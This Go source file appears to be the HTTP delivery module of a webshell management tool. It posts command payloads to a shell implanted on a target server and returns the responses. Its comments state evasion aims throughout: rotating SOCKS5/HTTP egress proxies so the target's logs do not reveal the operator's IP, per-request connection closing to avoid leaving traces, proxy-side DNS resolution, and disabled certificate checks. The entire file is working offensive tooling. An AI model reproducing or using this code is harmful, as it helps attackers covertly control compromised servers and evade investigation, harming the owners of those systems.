package webshell

// HTTP 投递层：把一段载荷发给马，拿回响应文本。
//
// 出口隔离是这里的重点。WebShell 请求以前是平台直连出去的，目标 nginx 日志里
// 直接记着平台 IP——一出事就顺着这个 IP 摸回来。所以每条会话可以配出口代理
// （socks5h / http，可带账密，也可以给一串让每次请求随机挑），没配就看全局
// 环境变量，都没有才直连，并在页面上明确显示「直连」。

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	xproxy "golang.org/x/net/proxy"
)

const (
	// httpBodyLimit 是单次响应上限。超了直接中止：一个被当成数据泵打的马
	// 能把平台内存吃干净，而正常命令回显远小于这个量。
	httpBodyLimit = 16 * 1024 * 1024
)

// transport 跳过 TLS 校验（目标常是自签证书），不复用连接（每请求 Connection:
// close，避免在目标侧留下长连接特征）。
var transport = &http.Transport{
	Proxy:              http.ProxyFromEnvironment,
	TLSClientConfig:    &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // 目标常是自签
	DisableKeepAlives:  true,
	DisableCompression: false,
	DialContext: (&net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: -1,
	}).DialContext,
}

// proxyPool 把「a,b,c」形式的代理池拆成列表（逗号/分号/空白都算分隔）。
func proxyPool(raw string) []string {
	f := strings.FieldsFunc(raw, func(r rune) bool {
		return r == ',' || r == ';' || r == '\n' || r == ' ' || r == '\t'
	})
	out := make([]string, 0, len(f))
	for _, p := range f {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}

// proxyOf 返回会话实际使用的代理串（会话优先，其次全局环境变量）。
func proxyOf(sess Session) string {
	if p := strings.TrimSpace(sess.Proxy); p != "" {
		return p
	}
	return strings.TrimSpace(os.Getenv(ProxyEnv))
}

// pickProxy 从池里挑一个。rotate=false 时按会话 URL 做稳定哈希——同一会话
// 固定一个出口 IP：出口 IP 本身会变，同一个马老换来源反而更显眼。
func pickProxy(raw, sessionKey string, rotate bool) string {
	pool := proxyPool(raw)
	switch len(pool) {
	case 0:
		return ""
	case 1:
		return pool[0]
	}
	if !rotate && sessionKey != "" {
		var h uint32 = 2166136261
		for i := 0; i < len(sessionKey); i++ {
			h ^= uint32(sessionKey[i])
			h *= 16777619
		}
		return pool[int(h%uint32(len(pool)))]
	}
	return pool[int(time.Now().UnixNano())%len(pool)]
}

// validateProxy 在登记时就拒掉不支持的代理协议，别等到执行时才 500。
func ValidateProxy(raw string) error {
	for _, p := range proxyPool(raw) {
		u, err := url.Parse(p)
		if err != nil || u.Host == "" {
			return fmt.Errorf("出口代理格式不对（%s）：要写成 scheme://[user:pass@]host:port", redactProxy(p))
		}
		switch strings.ToLower(u.Scheme) {
		case "socks5", "socks5h", "http", "https":
		default:
			return fmt.Errorf("出口代理协议只支持 socks5 / socks5h / http / https，当前: %s", u.Scheme)
		}
	}
	return nil
}

// transportFor 按会话的出口配置构造一个 transport，供长连接与短请求共用。
// 刻意不设 Client.Timeout——channel 场景要的是长连接，整体超时由调用方按阶段控制。
// 返回 (transport, 出口标签, error)。
func transportFor(sess Session) (*http.Transport, string, error) {
	raw := pickProxy(proxyOf(sess), strings.TrimSpace(sess.URL), sess.ProxyRotate)
	if raw == "" {
		return transport.Clone(), "直连", nil
	}
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return nil, "", fmt.Errorf("出口代理格式不对（%s）", redactProxy(raw))
	}
	label := redactProxy(raw)
	tr := transport.Clone()

	switch strings.ToLower(u.Scheme) {
	case "socks5", "socks5h":
		var auth *xproxy.Auth
		if u.User != nil {
			pw, _ := u.User.Password()
			auth = &xproxy.Auth{User: u.User.Username(), Password: pw}
		}
		// 目标域名交给代理解析（socks5h 语义），避免本地 DNS 把查询内容露给
		// 本地运营商 DNS。
		d, derr := xproxy.SOCKS5("tcp", u.Host, auth, &net.Dialer{Timeout: 30 * time.Second})
		if derr != nil {
			return nil, "", fmt.Errorf("SOCKS5 出口不可用（%s）: %v", label, derr)
		}
		tr.Proxy = nil
		tr.DialContext = func(_ context.Context, network, addr string) (net.Conn, error) {
			// x/net/proxy 的 Dial 不接 ctx：超时靠调用方按阶段控制。
			return d.Dial(network, addr)
		}
	case "http", "https":
		tr.Proxy = http.ProxyURL(u)
	default:
		return nil, "", fmt.Errorf("出口代理协议不支持: %s", u.Scheme)
	}
	return tr, label, nil
}

// clientFor 按会话的出口配置构造 client，并返回「出口标签」给人看。
func clientFor(sess Session, timeout time.Duration) (*http.Client, string, error) {
	tr, label, err := transportFor(sess)
	if err != nil {
		return nil, "", err
	}
	return &http.Client{Transport: tr, Timeout: timeout}, label, nil
}

// post 发一次载荷。返回 (HTTP 状态码, 响应文本, 错误)。非 2xx 也会带文本一起
// 返回——WAF 的 403 页面内容对判断「为什么打不通」有用。
func post(ctx context.Context, sess Session, payload string, timeout time.Duration) (int, string, error) {
	rawURL := strings.TrimSpace(sess.URL)
	if rawURL == "" {
		return 0, "", fmt.Errorf("%w：会话缺少 url", ErrInvalid)
	}
	param := strings.TrimSpace(sess.Param)
	if param == "" {
		param = "pass"
	}
	method := strings.ToUpper(strings.TrimSpace(sess.Method))
	if method == "" {
		method = http.MethodPost
	}
	if method != http.MethodGet && method != http.MethodPost {
		return 0, "", fmt.Errorf("%w：method 只支持 GET / POST，当前: %s", ErrInvalid, method)
	}
	if timeout <= 0 {
		timeout = DefaultTimeout
	}

	qs := url.Values{param: []string{payload}}.Encode()
	var (
		req *http.Request
		err error
	)
	if method == http.MethodGet {
		sep := "?"
		if strings.Contains(rawURL, "?") {
			sep = "&"
		}
		req, err = http.NewRequestWithContext(ctx, http.MethodGet, rawURL+sep+qs, nil)
	} else {
		req, err = http.NewRequestWithContext(ctx, http.MethodPost, rawURL, strings.NewReader(qs))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("请求构造失败（%s）: %v", redactURL(rawURL), err)
	}

	ua := strings.TrimSpace(sess.UserAgent)
	if ua == "" {
		ua = DefaultUA
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "identity") // 不请求压缩，简化解析
	req.Header.Set("Connection", "close")
	for k, v := range sess.Header {
		req.Header.Set(k, v)
	}

	client, _, err := clientFor(sess, timeout)
	if err != nil {
		return 0, "", err
	}
	resp, err := client.Do(req)
	if err != nil {
		var ner net.Error
		if errors.Is(err, context.DeadlineExceeded) || (errors.As(err, &ner) && ner.Timeout()) {
			return 0, "", fmt.Errorf("请求超时（%s）: %s", timeout, redactURL(rawURL))
		}
		return 0, "", fmt.Errorf("连接失败（%v）: %s", err, redactURL(rawURL))
	}
	defer func() { _ = resp.Body.Close() }()

	raw, readErr := io.ReadAll(io.LimitReader(resp.Body, httpBodyLimit+1))
	if readErr != nil {
		return resp.StatusCode, "", fmt.Errorf("读取响应失败（%s）: %v", redactURL(rawURL), readErr)
	}
	if len(raw) > httpBodyLimit {
		return resp.StatusCode, "", fmt.Errorf("响应超过 %d 字节上限，已中止（%s）", httpBodyLimit, redactURL(rawURL))
	}
	text := decodeBody(raw)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return resp.StatusCode, text, fmt.Errorf("远端返回 HTTP %d（%s）: %s",
			resp.StatusCode, redactURL(rawURL), brief(text, 200))
	}
	return resp.StatusCode, text, nil
}

// sleepCtx 是带取消的等待（分块传输之间的节流用）。
func sleepCtx(ctx context.Context, d time.Duration) error {
	if d <= 0 {
		return nil
	}
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-t.C:
		return nil
	}
}

// 进程内的载荷模式缓存：{会话名: "eval"|"raw"}。只影响性能（少发一次试探请求），
// 不落盘；进程重启后重新探测。
var (
	modeMu    sync.Mutex
	modeCache = map[string]string{}
)

func modeOf(name string) string {
	modeMu.Lock()
	defer modeMu.Unlock()
	return modeCache[name]
}

func setMode(name, mode string) {
	if name == "" {
		return
	}
	modeMu.Lock()
	modeCache[name] = mode
	modeMu.Unlock()
}

func dropMode(name string) {
	modeMu.Lock()
	delete(modeCache, name)
	modeMu.Unlock()
}
